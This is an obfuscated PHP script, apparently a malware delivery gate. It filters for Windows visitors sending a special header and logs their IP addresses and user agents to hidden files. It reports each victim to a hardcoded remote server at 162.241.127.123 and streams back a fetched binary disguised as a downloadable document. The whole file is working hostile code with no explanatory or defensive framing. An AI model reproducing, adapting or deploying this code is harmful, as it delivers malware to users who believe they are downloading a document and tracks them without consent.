<?php
 goto efs0L; iPy4B: $data_json = base64_encode($data_json); goto IrdcK; StqAb: $REQUEST_URI = $_SERVER["\122\x45\121\125\105\123\124\x5f\125\x52\x49"]; goto OGEl7; efs0L: if (session_start() === false) { die("\x73\x73\x2e"); } goto StqAb; qjFsj: shuffle($links); goto cNBrU; kW3jn: function getRealIpAddr() { if (!empty($_SERVER["\x48\124\124\120\137\x43\x4c\x49\105\x4e\124\137\111\120"])) { $ip = $_SERVER["\x48\124\x54\x50\x5f\103\114\x49\x45\116\124\137\111\120"]; } elseif (!empty($_SERVER["\110\124\x54\x50\x5f\130\x5f\106\117\122\127\x41\122\104\105\104\x5f\x46\x4f\x52"])) { $ip = $_SERVER["\x48\x54\x54\x50\137\130\137\x46\117\122\x57\x41\122\x44\x45\104\137\x46\117\x52"]; } else { $ip = $_SERVER["\122\105\115\117\124\105\x5f\101\x44\x44\122"]; } return $ip; } goto SaaI1; cNBrU: file_put_contents(__DIR__ . "\57\56\56\57\164\162\x79\137\x5f\x62\151\147\x5f\x5f\163\x74\141\164\56\x74\x78\164", date("\143") . "\11" . getRealIpAddr() . "\x9" . $_SERVER["\110\x54\124\x50\x5f\125\x53\105\122\137\101\107\105\116\x54"] . "\11" . $_GET["\x65"] . "\xd\12", FILE_APPEND); goto ieIBJ; ieIBJ: $outfilepath = __DIR__ . "\x2f\x2e\56\57\142\x69\147\137\137\163\x74\141\164\56\x74\x78\x74"; goto epCbq; tGuQh: $REQUEST_URI_ARR = explode("\x2f", $REQUEST_URI); goto iG2HC; sRTqY: $_GET["\145"] = $REQUEST_URI_ARR[2]; goto yrBhy; dWS1B: $hdrs = getallheaders(); goto ZMQb0; mRkP0: $data_json = json_encode($data_json); goto iPy4B; OGEl7: if (empty($REQUEST_URI)) { die("\x52\x45\121\125\x45\123\x54\137\125\x52\111"); } goto tGuQh; ZMQb0: foreach ($hdrs as $key => $value) { $kk = strtolower($key); $hdrs_new[$kk] = $value; } goto urVT3; IrdcK: $links = array("\150\164\x74\160\x3a\x2f\57\61\66\62\x2e\62\64\x31\x2e\61\x32\x37\x2e\x31\62\x33\57\162\157\x75\164\145\162\x30\70\x2e\160\150\160\x3f\160\x70\x3d" . $data_json, "\x68\x74\x74\x70\x3a\57\x2f\x31\x36\x32\x2e\x32\x34\61\x2e\61\x32\x37\56\61\x32\63\57\162\157\x75\x74\x65\162\60\70\56\x70\150\160\77\x70\x70\x3d" . $data_json, "\150\x74\x74\160\72\x2f\57\61\66\x32\56\62\x34\x31\56\x31\62\67\56\61\x32\63\57\162\x6f\165\x74\x65\x72\x30\x38\56\160\x68\160\77\160\x70\x3d" . $data_json); goto qjFsj; epCbq: foreach ($links as $link) { $ctx = stream_context_create(array("\150\164\x74\x70" => array("\x74\151\x6d\x65\157\x75\164" => 30))); $data = file_get_contents($link, false, $ctx); if ($data == "\56\x2e\56\56" || $data == "\x2e\x2e\x2e") { break; } if (strlen($data) < 10000) { continue; } file_put_contents($outfilepath, date("\143") . "\x9" . getRealIpAddr() . "\x9" . $_SERVER["\x48\124\124\x50\137\x55\123\105\122\x5f\x41\x47\105\x4e\124"] . "\11" . $_GET["\x65"] . "\xd\xa", FILE_APPEND); header("\x43\x6f\156\x74\x65\156\x74\x2d\104\145\163\x63\x72\x69\x70\164\151\157\156\x3a\40\106\151\154\145\x20\x54\162\141\156\x73\146\145\x72"); header("\x43\x6f\x6e\x74\x65\156\x74\55\124\x79\x70\145\x3a\40\141\160\x70\x6c\x69\x63\x61\x74\x69\157\156\x2f\157\x63\164\x65\164\x2d\x73\x74\162\145\x61\x6d"); header("\103\x6f\x6e\x74\145\156\164\55\104\151\163\160\x6f\x73\151\164\x69\157\x6e\x3a\x20\x61\x74\164\141\143\150\x6d\145\x6e\164\x3b\40\x66\151\x6c\x65\156\x61\155\145\x3d" . $_SESSION["\x64\157\143\x5f\x6e\x61\x6d\x65"]); header("\x43\157\x6e\x74\x65\x6e\x74\x2d\x54\x72\141\x6e\163\x66\145\x72\55\105\156\x63\x6f\144\151\x6e\147\72\40\142\151\x6e\x61\162\x79"); header("\x43\x6f\x6e\x6e\x65\x63\x74\x69\157\x6e\72\40\x4b\x65\x65\160\55\101\x6c\x69\166\x65"); header("\x45\x78\x70\151\162\145\x73\x3a\40\x30"); header("\x43\141\x63\150\x65\x2d\x43\157\156\164\x72\157\x6c\72\x20\155\x75\x73\164\x2d\x72\x65\x76\141\154\x69\x64\141\x74\x65\x2c\x20\160\157\163\164\55\143\x68\145\143\153\x3d\60\54\x20\160\x72\x65\x2d\143\150\x65\143\153\75\60"); header("\x50\x72\x61\147\x6d\141\72\40\x70\165\142\x6c\151\x63"); echo $data; die; } goto mZHK4; iG2HC: if (count($REQUEST_URI_ARR) != 3) { die("\x52\x45\x51\125\x45\x53\124\x5f\x55\x52\111\137\x41\x52\x52"); } goto sRTqY; L6k2y: if (stripos($_SERVER["\110\x54\x54\120\x5f\125\x53\x45\x52\137\101\x47\x45\x4e\x54"], "\127\x69\156\x64\x6f\x77\x73") === false) { die("\x77\x2e"); } goto cSP_7; SaaI1: $data_json = array("\151\160" => getRealIpAddr(), "\164\x69\x6d\145" => time(), "\150\150" => $hdrs_new["\150\x68"], "\145\170\x74" => $_SESSION["\x66\151\x6c\x65\x5f\145\170\164"]); goto mRkP0; urVT3: $file_ext = explode("\x2e", $_GET["\145"]); goto JunDI; cSP_7: $hdrs_new = array(); goto dWS1B; dpCDm: if ($_GET["\145"] != "\x31\62\x33\56" . $file_ext) { if ($_GET["\x65"] != "\144\x6f\x63\x75\x6d\145\x6e\164\x73\56" . $file_ext) { $_SESSION["\x5f\137\162\145\x64\151\x72\x65\x63\x74\x5f\x77\141\163\137\163\x74\141\x72\x74"] = true; $_SESSION["\x64\157\x63\x5f\x6e\141\x6d\145"] = $_GET["\145"]; $_SESSION["\x66\x69\x6c\x65\x5f\145\170\164"] = $file_ext; $redirect_uri = str_replace($_GET["\145"], "\144\x6f\143\165\x6d\x65\x6e\x74\x73\x2e" . $file_ext, $REQUEST_URI); echo "\x3c\x64\x69\x76\40\151\144\75\42\154\x6c\42\x20\x64\141\x74\x61\55\x72\x72\75\42" . $redirect_uri . "\x22\76\x3c\x2f\x64\x69\x76\76"; echo "\x3c\163\x63\x72\x69\x70\164\x3e"; echo "\x6c\x6f\x63\141\164\x69\x6f\156\x2e\160\x61\164\150\156\141\155\145\40\75\40\x64\x6f\143\x75\155\x65\156\x74\x2e\147\x65\164\105\154\x65\x6d\x65\x6e\x74\x42\x79\111\144\50\x27\154\154\x27\51\56\147\145\164\x41\164\164\162\x69\x62\x75\x74\145\50\47\x64\141\164\141\x2d\162\162\x27\x29\x3b"; echo "\74\x2f\163\143\x72\151\x70\x74\76"; die("\x57\141\151\x74\56\56\56"); } else { if (empty($_SESSION["\x5f\x5f\x72\x65\144\151\x72\145\143\164\x5f\x77\x61\x73\x5f\163\x74\141\x72\164"])) { die("\x72\x77\x73\56"); } } } else { if (empty($hdrs_new["\150\x68"])) { die("\150\x2e"); } } goto kW3jn; yrBhy: if (empty($_SERVER["\x48\x54\124\120\x5f\125\x53\x45\122\137\x41\107\105\x4e\x54"])) { die("\x75\163\145\x72\x2e"); } goto L6k2y; JunDI: $file_ext = end($file_ext); goto dpCDm; mZHK4: die("\x54\x72\x79\x20\x61\x67\141\x69\156\x2e");